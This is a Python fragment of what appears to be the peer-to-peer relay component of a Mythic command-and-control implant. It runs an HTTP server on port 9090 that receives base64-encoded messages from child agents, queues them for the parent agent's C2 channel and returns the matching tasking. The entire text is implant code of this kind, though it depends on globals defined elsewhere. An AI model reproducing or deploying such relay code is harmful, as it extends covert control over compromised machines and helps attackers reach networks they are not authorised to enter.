def p2p_server(task_id):

    from http.server import BaseHTTPRequestHandler, HTTPServer
    import threading

    class RequestHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            message = "Hello!"

            self.protocol_version = "HTTP/1.1"
            self.send_response(200)
            self.send_header("Content-Length", len(message))
            self.end_headers()

            self.wfile.write(bytes(message, "utf8"))
            return

        def do_POST(self):

            global delegates_aswers

            content_len = int(self.headers.get('content-length', 0))
            post_body = self.rfile.read(content_len)
            decode = base64.b64decode(post_body)
            decode = decode.decode("utf-8")

            plain = json.loads(decode[36:])


            print("\n[+]Received from p2p agent = ")
            print("\tUUID = " + str(decode)[:36])
            print("\tmessage = " + str(decode)[36:] + "\n")

            encoded = to64(decode)

            delegate = {
                "message": encoded,
                "uuid": agent.PayloadUUID,
                "c2_profile": "http"
            }

            delegates.append(delegate)

            while delegates_aswers == []:
                pass
            
            if plain["action"] != "checkin":
                for answer in delegates_aswers:

                    decoded_answer = base64.b64decode(answer["message"])
                    decoded_answer = decoded_answer.decode("utf-8")

                    print("\n[+] Sending to p2p agent = ")
                    print("\tUUID = " + answer["mythic_uuid"])
                    print("\tMessage = " + decoded_answer + "\n")

                    if answer["mythic_uuid"] == str(decode)[:36]:
                        message = answer['message']
                        self.protocol_version = "HTTP/1.1"
                        self.send_response(200)
                        self.send_header("Content-Length", len(message))
                        self.end_headers()
                        self.wfile.write(bytes(message, "utf8"))
                        delegates_aswers.remove(answer)
                        

            else:
                for answer in delegates_aswers:
                    if answer['mythic_uuid'] == agent.PayloadUUID:
                        message = answer['message']
                        self.protocol_version = "HTTP/1.1"
                        self.send_response(200)
                        self.send_header("Content-Length", len(message))
                        self.end_headers()
                        self.wfile.write(bytes(message, "utf8"))
                        delegates_aswers.remove(answer)
            





    def run():
        server = ('', 9090)
        httpd = HTTPServer(server, RequestHandler)
        thread = threading.Thread(target = httpd.serve_forever, daemon=True)
        thread.start()
    run()